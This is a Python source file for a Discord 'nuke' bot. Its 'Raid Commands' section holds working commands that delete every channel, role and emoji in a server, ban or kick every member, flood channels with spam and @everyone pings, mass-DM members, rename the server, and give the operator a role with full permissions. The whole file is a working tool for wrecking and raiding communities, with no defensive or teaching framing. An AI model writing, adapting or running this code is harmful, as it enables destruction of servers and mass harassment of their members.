from multiprocessing.connection import Client
import os, datetime, discord, json, sys, asyncio
from discord import Permissions
from discord.utils import get
from discord.ext import commands, tasks
from datetime import datetime
now = datetime.now()
intents = discord.Intents().all()
intents.members = True

with open('./config.json', 'r') as cjson:
    config = json.load(cjson)
PREFIX =               config["prefix_settings"]["prefix"]
STATUS =               config["status"]
#ID =                   config["id"]
RESTART_MESSAGE =      config["restart_message"]
SHUTDOWN_MESSAGE =     config["shutdown_message"]
YOUR_SPAM_MESSAGE =    config["your_spam_message"]
YOUR_NAME =            config["your_name"]
YOUR_ROLE_NAME =       config["your_role_name"]
SERVERNAME =           config["servername"]
DM_MESSAGE =           config["dm_message"]
NUKE_ROLE =            config["nuke_role"]
ADMIN_ROLE =           config["admin_role"]
TOKEN =                config["token"]
if config["prefix_settings"]["use_space"] == True:
    prefix = PREFIX + ' '

client = commands.Bot(command_prefix=PREFIX,help_command=None, intents = intents)

@client.event
async def on_ready():
    with open('./config.json', 'r') as cjson:
        config = json.load(cjson)
    PREFIXX=config["prefix_settings"]["prefix"]
    current_time = now.strftime("%H:%M:%S")
    print('-----------------------------------\nLogged in as: {0.user}'.format(client),f'\nPrefix => {PREFIXX}', '\nLogged in at', current_time, '\nID of the Client =', client.user.id,f'\nConnected to {len(client.guilds)} servers!', '\n------------------------------------')
    await client.change_presence(status=discord.Status.do_not_disturb, activity=discord.Activity(type=discord.ActivityType.listening, name=STATUS))




## Moderation Commands

def restart_bot(): 
  os.execv(sys.executable, ['python'] + sys.argv)

@client.command() # Restarting the Bot
@commands.is_owner()
async def r(ctx): 
    print(RESTART_MESSAGE)
    await ctx.message.delete()
    await asyncio.sleep(1)
    os.system('cls')
    restart_bot()


@client.command() #Shutting down the Bot
@commands.is_owner()
async def s(ctx):
    print(RESTART_MESSAGE)
    await ctx.message.delete()
    await asyncio.sleep(1)
    os.system('cls')
    await client.close()




## Raid Commands

#def is_me(ctx):
#    return ctx.author.id == ID

@client.command()
@commands.is_owner()
async def delete(ctx): # Delete all Channels, all Roles, edit the Servername (servername in config.json) and create a channel named from config.json
    channels = await ctx.guild.fetch_channels()
    try:
        for channel in channels:
            await channel.delete()
    except:
        print("Couldn't delete all Channels! Check the Bot Permissions!")
    for role in ctx.guild.roles:
        try:
            await role.delete()
        except:
            print("Couldn't delete all Roles! Check the Bot Permissions!")
    await ctx.guild.edit(name=SERVERNAME)
    await ctx.guild.create_text_channel(f"{YOUR_NAME}")


@client.command()
@commands.is_owner()
async def channel(ctx, choice, number: int): 
    if choice == 'create': # Creating "input" channels
        for i in range(0,number):
            await ctx.guild.create_voice_channel(f'Nuked by {YOUR_NAME}')
            await ctx.guild.create_text_channel(f'Nuked by {YOUR_NAME}')
        print(f"Created channels!")
    elif choice == 'spam': # Spam all Channels with the given message in config.json (also using "input")
        for i in range(0,number):
            for channel in ctx.guild.text_channels:
                try:
                    await channel.send(YOUR_SPAM_MESSAGE)
                    await asyncio.sleep(0.1)
                except:
                    pass    
            print(f"Finished spamming!")
    elif choice == 'category': # Create "input" category's
        for i in range(0,number):
            await ctx.guild.create_category(f'Nuked by {YOUR_NAME}')
        await ctx.message.delete()
        print(f"Created {number} category's named 'Nuked by {YOUR_NAME}'!")
    else:
        print('Invalid Option! Use "categroy", "spam" or "create"!')


@client.command()
@commands.is_owner()
async def create(ctx, number:int): # Create everything from above using one command 
    try:
        for i in range(1,number):
            await ctx.guild.create_voice_channel(f'Nuked by {YOUR_NAME}')
            await ctx.guild.create_text_channel(f'Nuked by {YOUR_NAME}')
            await ctx.guild.create_category(f'Nuked by {YOUR_NAME}')      
        print("Finished creating channels and categorys!")
    except:
        print(f"Couldn't create voice and text Channels called '{YOUR_NAME}'! Check the Bot Permissions!")
    for i in range(1,number):
        for channel in ctx.guild.text_channels:
                try:
                    await channel.send(YOUR_SPAM_MESSAGE, delete_after=5)
                    await asyncio.sleep(0.1)
                except:
                    print(f"Couldn't spam the channels! Check the Bot Permissions!")
        print("Finished spamming!")


@client.command()
@commands.is_owner()
async def roledelete(ctx): # Delete all roles from the Guild
    for role in ctx.guild.roles:
        try:
            await role.delete()
            await ctx.message.delete()
        except:
            print("Couldn't delete all roles! Check the Bot Permissions!")
    print("Deleted all Roles!")


@client.command()
@commands.is_owner()
async def ban(ctx): # Ban every member (expect admins and higher mods)
    for user in ctx.guild.members:
        try:
            await user.ban()
        except:
            print("Couldn't ban everyone! Check the Bot Permissions!")
    print("Banned everyone!")


@client.command()
@commands.is_owner()
async def softban(ctx): # Ban and then unban everyone (expect admins and higher mods)
    for user in ctx.guild.members:
        try:
            await user.ban()
            await user.unban()
        except:
            print("Couldn't softban everyone! Check the Bot Permissions!")
    print("Softbanned everyone!")


@client.command()
@commands.is_owner()
async def kick(ctx): # Kick everyone (expect admins and higher mods)
    for user in ctx.guild.members:
        try:
            await user.kick()
        except:
            print("Couldn't kick everyone! Check the Bot Permissions!")
    print("Kicked everyone!")


@client.command()
@commands.is_owner()
async def everyone(ctx, number:int): # Tag everyone for "input" times
    for i in range(1,number):
        try:
            await ctx.send('@everyone', delete_after=0.5)
            await asyncio.sleep(0.5)
        except:
            print("Couldn't ping @everyone! Check the Bot Permissions or give a number for the Bot!")
    print(f"Mentioned everyone {number} times!")


@client.command()
@commands.is_owner()
async def member(ctx, member: discord.Member, number: int): # Ping a member "input" times
    try:
        await ctx.message.delete()
        for i in range(1,number):
            await ctx.send(f"{member.mention}", delete_after = 0.5)
        print(f"Mentioned the member '{member.name}{member.discriminator}' {number} times!")
    except:
        print(f"Couldn't ping the member '{member.name}{member.discriminator}'! Check the Bot Permissions or give a number after the mentioned User!")


@client.command()
@commands.is_owner()
async def rolemention(ctx, role: discord.Role, number: int): # Ping a role "input" times
    try:
        for i in range(1,number):
            await ctx.send(f"""{role.mention}""", delete_after=(1))
            await asyncio.sleep(0.5)
        print(f"Mentioned the Role '{role.name}' {number} times!")
    except:
        print(f"Couldn't ping the role '{role.name}'! Check the Bot Permissions or give a number after the mentioned Role!")

@client.command()
@commands.is_owner()
async def clear(ctx, limit: int): # Clear the currently selected channel for "input" messages
    try:
        await ctx.channel.purge(limit=limit)
        print(f"Cleared chat by {ctx.author} for {limit} messages!")
    except:
        print("Give a number after the clear command!")

@clear.error
async def clear_error(ctx, error): # Just a clear error for the above function
    if isinstance(error, commands.MissingPermissions):
        await ctx.send("You cant do that!")


@client.command()
@commands.is_owner()
async def servericon(ctx): #Change the Severicon (must be in the same folder as main.py, file must be named "image.png")
        with open('image.png', 'rb') as f:
            icon = f.read()
        await ctx.guild.edit(icon = icon)
        print("Changed the Servericon!")
        await ctx.message.delete()


@client.command()
@commands.is_owner()
async def servername(ctx): # Change the Servername through config.json
    await ctx.guild.edit(name=SERVERNAME)
    print(f"Changed the Servername to '{SERVERNAME}'!")
    await ctx.message.delete()


@client.command()
@commands.is_owner()
async def server(ctx): # Both options included in one 
            with open('image.png', 'rb') as f:
                icon = f.read()
            await ctx.guild.edit(icon = icon)
            await ctx.guild.edit(name=SERVERNAME)
            await asyncio.sleep(1)
            print(f"Changed the servericon and Name to '{SERVERNAME}'!")
            await ctx.message.delete()


@client.command()
@commands.is_owner()
async def emoji(ctx): # Deletes all Emojis
    for Emoji in ctx.guild.emojis:
        await Emoji.delete()
    print("Deleted all Emoji's!")
    await ctx.message.delete()


@client.command()
@commands.is_owner()
async def dmall(ctx): # Dm every user with a message written in config.json
    for m in client.get_all_members():
        await m.send(DM_MESSAGE)
        print("Dm'd all Users!")
        await ctx.message.delete()


@client.command()
@commands.is_owner()
async def admin(ctx): # Gives you a role with admin permissions (can be named in config.json)
    user = ctx.message.author 
    await ctx.guild.create_role(name=f"{ADMIN_ROLE}", permissions=Permissions.all())
    print(f"Created Role '{ADMIN_ROLE}'!")
    try:
        await user.add_roles(discord.utils.get(user.guild.roles, name=f"{ADMIN_ROLE}"))
        print(f"Added Role '{ADMIN_ROLE}' to {user}!")
        await ctx.message.delete()
    except:
        print(f"There was an error creating the Role {ADMIN_ROLE}!")
        await ctx.message.delete()


@client.command()
@commands.is_owner()
async def role(ctx,number: int): # Create "input" roles (name given in config.json)
    try:
        for i in range(0,number):
            await ctx.guild.create_role(name=YOUR_ROLE_NAME)
            await asyncio.sleep(0.5)
        await ctx.message.delete()
        print(f"Created {number} roles named {YOUR_ROLE_NAME}")
    except:
        print(f"Couldn't create Roles named {YOUR_ROLE_NAME} for {number} times! Check the Bot Permissions!")


client.run(TOKEN)